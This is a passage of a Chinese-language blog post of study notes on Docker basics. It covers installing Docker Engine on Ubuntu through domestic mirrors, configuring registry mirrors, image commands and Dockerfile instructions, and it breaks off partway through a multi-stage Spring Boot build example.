class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 移除旧版本 Docker</span><br><span class="hljs-built_in">sudo</span> apt remove docker docker-engine docker.io containerd runc<br><br><span class="hljs-built_in">sudo</span> apt autoremove<br><br><br><span class="hljs-comment"># 2. 安装必要的依赖包</span><br><span class="hljs-built_in">sudo</span> apt install -y apt-transport-https ca-certificates curl software-properties-common<br><br><br><span class="hljs-comment"># 3. 添加 Docker 的官方 GPG 密钥（使用国内CDN）</span><br><span class="hljs-comment"># 3.1. 创建存放 GPU 秘钥的目录</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/apt/keyrings<br><br><span class="hljs-comment"># 3.2. 获取 GPU 秘钥</span><br>curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | <span class="hljs-built_in">sudo</span> gpg --dearmor -o /etc/apt/keyrings/docker.gpg<br><br><br><span class="hljs-comment"># 4. 添加 Docker 的 APT 仓库（中科大源）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null<br><br><br><span class="hljs-comment"># 5. 更新 APT 包索引，让修改生效</span><br><span class="hljs-built_in">sudo</span> apt update<br><br><br><span class="hljs-comment"># 6. 安装 Docker Engine</span><br><span class="hljs-built_in">sudo</span> apt install -y docker-ce docker-ce-cli containerd.io<br><br><br><span class="hljs-comment"># 7. 检查 Docker</span><br>docker --version<br>或<br>docker info<br><br><br><span class="hljs-comment"># 7. 启动并设置开机自启动</span><br><span class="hljs-built_in">sudo</span> systemctl start docker &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> docker<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果启动 docker 时出现错误，我们可以：</li></ol></blockquote><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 1. 找出是哪个依赖挂了</span><br><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-dependencies</span> <span class="hljs-string">docker</span>.<span class="hljs-string">service</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">root@user-virtual-machine:~# systemctl list-dependencies docker.service</span><br><span class="hljs-string">docker.service</span><br><span class="hljs-string">● ├─containerd.service</span><br><span class="hljs-string">× ├─docker.socket              # 如果是这里出现错误，可能是在安装脚本时没有创建 docker 用户组</span><br><span class="hljs-string">● ├─system.slice</span><br><span class="hljs-string">● ├─network-online.target</span><br><span class="hljs-string">● │ └─NetworkManager-wait-online.service</span><br><span class="hljs-string">● └─sysinit.target</span><br><span class="hljs-string">●   ├─apparmor.service</span><br><span class="hljs-string">●   ├─dev-hugepages.mount</span><br><span class="hljs-string">●   ├─dev-mqueue.mount</span><br><span class="hljs-string">●   ├─keyboard-setup.service</span><br><span class="hljs-string">●   ├─kmod-static-nodes.service</span><br><span class="hljs-string">●   ├─plymouth-read-write.service</span><br><span class="hljs-string">●   ├─plymouth-start.service</span><br><span class="hljs-string">●   ├─proc-sys-fs-binfmt_misc.automount</span><br><span class="hljs-string">●   ├─setvtrgb.service</span><br><span class="hljs-string">●   ├─sys-fs-fuse-connections.mount</span><br><span class="hljs-string">●   ├─sys-kernel-config.mount</span><br><span class="hljs-string">●   ├─sys-kernel-debug.mount</span><br><span class="hljs-string">●   ├─sys-kernel-tracing.mount</span><br><span class="hljs-string">○   ├─systemd-ask-password-console.path</span><br><span class="hljs-string">●   ├─systemd-binfmt.service</span><br><span class="hljs-string">○   ├─systemd-boot-system-token.service</span><br><span class="hljs-string">●   ├─systemd-journal-flush.service</span><br><span class="hljs-string">●   ├─systemd-journald.service</span><br><span class="hljs-string">○   ├─systemd-machine-id-commit.service</span><br><span class="hljs-string">●   ├─systemd-modules-load.service</span><br><span class="hljs-string">○   ├─systemd-pstore.service</span><br><span class="hljs-string">●   ├─systemd-random-seed.service</span><br><span class="hljs-string">●   ├─systemd-sysctl.service</span><br><span class="hljs-string">●   ├─systemd-sysusers.service</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-comment"># 2. 创建 docker 用户组</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">groupadd</span> <span class="hljs-string">docker</span><br><br><br><span class="hljs-comment"># 3. 启动 docker.socket</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-string">start</span> <span class="hljs-string">docker</span>.<span class="hljs-string">socket</span><br><br><br><span class="hljs-comment"># 4. 重启和开机自启动 docker</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-string">start</span> <span class="hljs-string">docker</span> &amp;&amp; <span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-string">enable</span> <span class="hljs-string">docker</span><br></code></pre></td></tr></table></figure><hr><h4 id="4-3-配置-Docker（Docker-Engine）"><a href="#4-3-配置-Docker（Docker-Engine）" class="headerlink" title="4.3. 配置 Docker（Docker Engine）"></a>4.3. 配置 Docker（Docker Engine）</h4><p>我们可以<strong>为 Docker 配置代理</strong>，或者在Docker 1.10.0之后的版本，用以下方式为 Docker 配置国内镜像加速器，以提高 Docker 镜像的拉取速度。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 创建 Docker 配置目录（如果不存在）</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/docker<br><br><br><span class="hljs-comment"># 2. 配置 Docker 镜像加速器</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://dh-mirror.gitverse.ru&quot;</span>]<br>&#125;<br>EOF<br><br><br><span class="hljs-comment"># 3. 重新加载 Docker 配置并重启服务</span><br><span class="hljs-built_in">sudo</span> systemctl daemon-reload &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl restart docker<br><br><br><span class="hljs-comment"># 4. 检查是否配置成功</span><br><span class="hljs-built_in">sudo</span> docker info<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">加速器的原理</font>：<ul><li>当你从 Docker Hub 拉取镜像时，加速器会自动将你请求的镜像（如果它之前没有缓存）从 Docker Hub 拉取到加速器服务器，并且在加速器缓存中存储该镜像。这样，其他使用该加速器的用户会更快地下载到相同的镜像。</li></ul></li><li><font color="#00b0f0">常用 Docker 加速器</font>：<ul><li>GitVerse：<ul><li>加速器地址：<a href="https://dh-mirror.gitverse.ru/">https://dh-mirror.gitverse.ru</a>    （慢）</li><li>配置文档：<a href="https://gitverse.ru/docs/artifactory/registry-mirrors/dh-mirror/">GiteVerse 加速器配置文档</a></li></ul></li><li>DaoCloud：<ul><li>加速器地址：<a href="https://docker.m.daocloud.io/">https://docker.m.daocloud.io</a>    （快）</li></ul></li><li>社区提供：<ul><li><a href="https://hub.rat.dev/">https://hub.rat.dev/</a>    （慢）</li><li><a href="https://docker.1panel.live/">https://docker.1panel.live/</a>    （慢）</li></ul></li></ul></li><li><font color="#00b0f0">加速器变动问题</font>：<ul><li>您可能会发现，许多加速器已发生变动，无法继续使用（如阿里云加速器、腾讯云加速器）。这通常是由于运营商网络等不稳定因素导致镜像加速器无法成功拉取指定版本的容器镜像。因此，建议在生产环境中谨慎依赖 Docker Hub 提供的容器镜像。</li><li>为了确保稳定性和安全性，阿里云推荐使用其<a href="https://help.aliyun.com/zh/acr/user-guide/artifact-center">制品中心</a>提供的官方支持的容器基础镜像。</li></ul></li><li><font color="#00b0f0">实际开发中发现的问题</font>：<ul><li>配置加速器后，虽然能加速 <code>docker pull</code> 命令，但是仍旧无法正常执行 <code>docker search</code> 命令</li></ul></li></ol></blockquote><hr><h4 id="4-4-Docker-Engine-相关命令"><a href="#4-4-Docker-Engine-相关命令" class="headerlink" title="4.4. Docker Engine 相关命令"></a>4.4. Docker Engine 相关命令</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 1. Docker 的版本</span><br><span class="hljs-attribute">docker</span> --version<br><br><br><span class="hljs-comment"># 2. Docker 的详细信息（包括容器数、镜像数、运行状态等）</span><br>docker <span class="hljs-literal">info</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-Docker-Image（镜像）"><a href="#5-Docker-Image（镜像）" class="headerlink" title="5. Docker Image（镜像）"></a>5. Docker Image（镜像）</h3><h4 id="5-1-Docker-Image-概述"><a href="#5-1-Docker-Image-概述" class="headerlink" title="5.1. Docker Image 概述"></a>5.1. Docker Image 概述</h4><p>镜像是一个只读的“程序模板”，用于创建 Docker 容器。它包含了应用运行所需的所有内容，包括操作系统环境、应用程序、库文件等，由镜像创建容器，就像是根据模板制造实际的产品（一个镜像可以制作很多很多的容器）</p><hr><h4 id="5-2-Docker-Image-命令"><a href="#5-2-Docker-Image-命令" class="headerlink" title="5.2. Docker Image 命令"></a>5.2. Docker Image 命令</h4><p>&#x3D;&#x3D;1.查看镜像&#x3D;&#x3D;</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 1. 查看 Docker 主机存在的所有镜像</span><br><span class="hljs-attribute">docker</span> images<br><br><br><span class="hljs-comment"># 2. 查看指定镜像</span><br>docker images zookeeper<br><br><br><span class="hljs-comment"># 3. 仅显示镜像 ID（常用于一键删除所有镜像）</span><br>docker images -q<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250313102408127.png"></p><ol><li>&#x3D;&#x3D;REPOSITORY&#x3D;&#x3D;：<ol><li>镜像的名称</li></ol></li><li>&#x3D;&#x3D;TAG&#x3D;&#x3D;：<ol><li>镜像的标签，一般指版本号，如 <code>v1.0</code>、<code>1.0</code>、<code>latest</code> 等等</li></ol></li><li>&#x3D;&#x3D;IMAGE ID&#x3D;&#x3D;：<ol><li>镜像的唯一 ID（截断版，前12位，后续引用时可简写，只要能唯一区分）</li></ol></li><li>&#x3D;&#x3D;CREATED&#x3D;&#x3D;：<ol><li>镜像的创建时间</li></ol></li><li>&#x3D;&#x3D;SIZE&#x3D;&#x3D;：<ol><li>镜像的大小</li></ol></li></ol><p>&#x3D;&#x3D;2.搜索镜像&#x3D;&#x3D;</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 1. 命令行搜索（来源于DockerHub）</span><br><span class="hljs-attribute">docker</span> search nginx<br><br><br><span class="hljs-comment"># 2. 直接上 DockerHub 官网搜索</span><br><br><br><span class="hljs-comment"># 3. 直接上其他镜像仓库搜索（例如阿里云）</span><br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250313102619922.png"></p><blockquote><p>[!NOTE] 注意事项：上官网搜索的好处</p><ol><li>当我们可以查看某镜像特定版本还可以查阅相关文档</li></ol></blockquote><p>&#x3D;&#x3D;3.拉取镜像&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 从 DockerHub 中拉取镜像（未指定 image-tag，默认拉取 latest）</span><br>docker pull &lt;image-name&gt;<span class="hljs-symbol">:&lt;image-tag&gt;</span><br><br><br><span class="hljs-comment"># 2. 从其他镜像仓库拉取镜像（以阿里云为例）</span><br>docker pull crpi-eq36m90bmg934mtm.cn-beijing.personal.cr.aliyuncs.com/wangjia5289/<span class="hljs-symbol">first_test:</span>[镜像版本号]<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>下载公共镜像无需登录账户（<code>docker login</code>），但若下载私有镜像，则需先使用个人账号登录，无论是 DockerHub 还是阿里云仓库，均遵循此规则</li></ol></blockquote><p>&#x3D;&#x3D;4.加载镜像&#x3D;&#x3D;<br>将一个通过 <code>docker save</code> 命令导出的 Docker 镜像 tar 包加载到本地 Docker 环境中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 加载镜像 tar 包</span><br><span class="hljs-attribute">docker</span> load -i mynginx-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.tar<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.推送镜像&#x3D;&#x3D;<br>见下文：Docker Registry（仓库）</p><p>&#x3D;&#x3D;6.删除镜像&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 删除指定镜像（不能删除正在运行容器的镜像）</span><br>docker rmi &lt;image-name&gt;<span class="hljs-symbol">:&lt;image-tag&gt;</span> / &lt;image-id&gt;<br><br><br><span class="hljs-comment"># 2. 强制删除镜像</span><br>docker rmi -f &lt;image-name&gt;<span class="hljs-symbol">:&lt;image-tag&gt;</span> / &lt;image-id&gt;<br><br><br><span class="hljs-comment"># 3. 删除所有镜像</span><br>docker rmi -f <span class="hljs-variable">$&#123;</span>docker images -q&#125;<br><br><br><span class="hljs-comment"># 4. 删除所有未运行容器的镜像</span><br>docker image prune<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;7.保存镜像&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 将镜像推送到镜像仓库</span><br>见下文：Docker Registry（仓库）<br><br><br><span class="hljs-comment"># 2. 将镜像导出为 tar 包（需要时使用 docker load 加载）</span><br>docker save -o <span class="hljs-regexp">/home/u</span>ser<span class="hljs-regexp">/backups/my</span>nginx-<span class="hljs-number">1.0</span>.tar mynginx:v1.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;-o &#x2F;home&#x2F;user&#x2F;backups&#x2F;mynginx-1.0.tar&#x3D;&#x3D;：<ol><li>指定导出文件的路径和文件名</li><li>如仅填写 <code>mynginx-1.0.tar</code>，表示将文件保存在当前目录下</li></ol></li><li>&#x3D;&#x3D;mynginx:v1.0&#x3D;&#x3D;：<ol><li>镜像的版本标签（如省略，默认保存带有 <code>latest</code> 标签的镜像）。</li></ol></li></ol><p>&#x3D;&#x3D;8.构建镜像&#x3D;&#x3D;<br>见下文：Docker Image（镜像） &#x2F; Docker Image 构建方法</p><hr><h4 id="5-3-Docker-Image-构建方法"><a href="#5-3-Docker-Image-构建方法" class="headerlink" title="5.3. Docker Image 构建方法"></a>5.3. Docker Image 构建方法</h4><h5 id="5-3-1-从现有容器构建-Docker-镜像"><a href="#5-3-1-从现有容器构建-Docker-镜像" class="headerlink" title="5.3.1. 从现有容器构建 Docker 镜像"></a>5.3.1. 从现有容器构建 Docker 镜像</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 将一个运行中的容器保存为一个新的镜像，从而捕获容器内的所有更改。</span><br><span class="hljs-attribute">docker</span> commit -a <span class="hljs-string">&quot;LeiFeng&quot;</span> -m <span class="hljs-string">&quot;update index.html&quot;</span> mynginx_Container mynginx:v1.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;-a “LeiFeng”&#x3D;&#x3D;：<ol><li>指定作者信息</li></ol></li><li>&#x3D;&#x3D;-m “update index.html”&#x3D;&#x3D;：<ol><li>提交说明，类似我们提交 Git 时的说明 “first commit”</li></ol></li><li>&#x3D;&#x3D;mynginx_Container&#x3D;&#x3D;:<ol><li>要提交的容器，可以使用<code>&lt;container-name&gt; / &lt;container-id&gt;</code></li></ol></li><li>&#x3D;&#x3D;mynginx:v1.0&#x3D;&#x3D;：<ol><li><font color="#00b0f0">mynginx</font>：<ol><li>新镜像的名称</li></ol></li><li><font color="#00b0f0">v1.0</font>：<ol><li>镜像的版本标签（如果省略，Docker 默认会使用 <code>latest</code> 标签）。</li></ol></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>提交时会暂停容器运行</li></ol></blockquote><hr><h5 id="5-3-2-通过-Docker-File-构建-Docker-镜像"><a href="#5-3-2-通过-Docker-File-构建-Docker-镜像" class="headerlink" title="5.3.2. 通过 Docker File 构建 Docker 镜像"></a>5.3.2. 通过 Docker File 构建 Docker 镜像</h5><h6 id="5-3-2-1-Docker-File-概述"><a href="#5-3-2-1-Docker-File-概述" class="headerlink" title="5.3.2.1. Docker File 概述"></a>5.3.2.1. Docker File 概述</h6><p><code>Dockerfile</code> 是一个用于定义 Docker 容器镜像的文本文件，其中包含一组指令，指示 Docker 如何根据 <code>Dockerfile</code> 中的步骤构建一个 Docker 镜像</p><p><code>Dockerfile</code> 就是一个普通的文本文件，保存在哪里都可以，只要在构建镜像时能访问到它就行</p><hr><h6 id="5-3-2-2-Docker-File-基础指令"><a href="#5-3-2-2-Docker-File-基础指令" class="headerlink" title="5.3.2.2. Docker File 基础指令"></a>5.3.2.2. Docker File 基础指令</h6><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># FROM：基于哪个镜像构建新镜像，一个阶段只能有一个 FROM（AS builder 表示此阶段命名为 builder，后续阶段可以使用 --from=builder 引用该阶段容器）</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span> AS builder<br><br><br><span class="hljs-comment"># LABEL：元数据，如作者、版本等信息。</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;yourname@example.com&quot;</span>                             <span class="hljs-comment"># 维护者</span></span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> version=<span class="hljs-string">&quot;1.0&quot;</span></span><br><br><br><span class="hljs-comment"># SHELL：指定当前阶段后续命令的 shell。默认使用轻量级的 /bin/sh -c，但在需要更强大功能（如复杂脚本、命令扩展、管道、数组操作等）时，可以切换为 /bin/bash -c</span><br><span class="hljs-keyword">SHELL</span><span class="language-bash"> [<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>] </span><br><br><br><span class="hljs-comment"># WORKDID：设置容器中的工作目录。后续的 RUN, Copy, CMD, ENTRYPOINT 等指令都会在这个目录下执行（若不存在此目录，将自动创建）</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app </span><br><br><br><span class="hljs-comment"># RUN：执行 Shell 命令，通常用来在容器内安装软件包、配置文件、下载依赖等（容器里安装的软件和宿主机互不影响）</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y curl vim </span><br><br><br><span class="hljs-comment"># COPY：将宿主机中的文件或目录复制到镜像中的指定位置。</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . /app                              <span class="hljs-comment"># 将 DocekerFile 所在目录的所有文件复制到镜像中的 /app 目录</span></span><br><br><br><span class="hljs-comment"># ADD：类似于 COPY，但是 ADD 除了可以复制文件，还能解压 tar 文件、下载网络资源（URL）。</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> myapp.tar.gz /app                    <span class="hljs-comment"># 将本地 tar 文件解压到镜像的 /app 目录</span></span><br><br><br><span class="hljs-comment"># VOLUME：创建挂载点，它会在容器运行时创建一个目录（通常是空目录），并且可以通过 Docker 挂载到主机上。</span><br><span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/data&quot;</span>]                        <span class="hljs-comment"># 创建一个挂载点 /data</span></span><br><br><br><span class="hljs-comment"># ENTRYPOINT：指定容器启动后的执行命令，不可被覆盖，通常与 CMD 一起使用</span><br><span class="hljs-comment"># CMD：指定容器启动后的执行命令，可以在容器运行时被覆盖（CMD 可以有多个，但只会执行最后一个 CMD）</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;python3&quot;</span>] </span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;app.py&quot;</span>]</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>通常将 <code>ENTRYPOINT</code> 和 <code>CMD</code> 结合使用，虽然可以直接在 <code>ENTRYPOINT</code> 中固定执行逻辑，比如 <code>ENTRYPOINT [&quot;python3&quot;, &quot;app.py&quot;]</code>，但这种方式缺乏灵活性，无法轻松更换运行的文件。</li><li>如果采用 <code>ENTRYPOINT + CMD</code> 的方式，运行容器时可以轻松覆盖默认执行文件。例如：<code>docker run my-app other-app.py</code>，这里用 <code>other-app.py</code> 替代了默认的 <code>app.py</code>。</li><li>为什么能替换执行文件：这其实是 Docker 的一个非常灵活的特性。我们默认的执行文件确实是 <code>app.py</code>，但是如果 <code>other-app.jar</code> 必须在镜像内已经存在，或者通过挂载（<code>-v</code>）从宿主机提供。如果我们使用 <code>run my-app other-app.py</code> ，Docker 容器会在运行时接收参数，这些参数会覆盖 <code>CMD</code> 的默认值。</li></ol></blockquote><hr><h6 id="5-3-2-3-基于-Spring-Boot-项目的构建示例"><a href="#5-3-2-3-基于-Spring-Boot-项目的构建示例" class="headerlink" title="5.3.2.3. 基于 Spring Boot 项目的构建示例"></a>5.3.2.3. 基于 Spring Boot 项目的构建示例</h6><p>&#x3D;&#x3D;1.补充：多阶段构建&#x3D;&#x3D;<br>在 Dockerfile 中，我们可以定义多个构建阶段（<code>FROM</code> 指令可以出现多次），每个阶段拥有独立的环境和依赖。最终，只将构建产物（如 JAR 包等可执行文件）拷贝到最终的运行镜像中。</p><p>以 Spring Boot 项目为例，通常使用 Maven 进行构建和依赖管理。构建阶段需要依赖大量的工具和库（如 Maven、JDK 和构建工具等），但这些内容在生产环境中是不必要的。</p><p>通过多阶段构建，在构建阶段配置合适的环境和依赖以生成可执行 JAR 包，而在运行阶段，只将构建生成的 JAR 包拷贝到镜像中。此阶段的镜像仅包含运行时环境（如 JRE），不包含任何构建工具，进一步精简镜像内容，从而有效减小镜像体积。</p><p>&#x3D;&#x3D;2.创建 Docker File&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 创建存放 Docker File 的目录</span><br><span class="hljs-built_in">mkdir</span> -p /etc/temp<br><br><br><span class="hljs-comment"># 2. 创建一个空的 Docker File 文件</span><br><span class="hljs-built_in">touch</span> /etc/temp/Dockerfile<br><br><br><span class="hljs-comment"># 3. 进入 /etc/temp 目录</span><br><span class="hljs-built_in">cd</span> /etc/temp<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.编辑 Docker File&#x3D;&#x3D;</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># builder 阶段</span><br><br><span class="hljs-comment"># maven:3.8.7-eclipse-temurin-17 它包含了 Maven 和 JDK 17 的环境</span><br><span class="hljs-keyword">FROM</span> maven:<span class="hljs-number">3.8</span>.<span class="hljs-number">7</span>-eclipse-temurin-<span class="hljs-number">17</span> AS builder<br><br><br><span class="hljs-comment"># 设置工作目录</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><br><br><span class="hljs-comment"># 将 DockerFile 所在目录中项目的 pom.xml 文件复制到容器内的 /app 目录。</span><br><span class="hljs-keyword">COPY</span><span 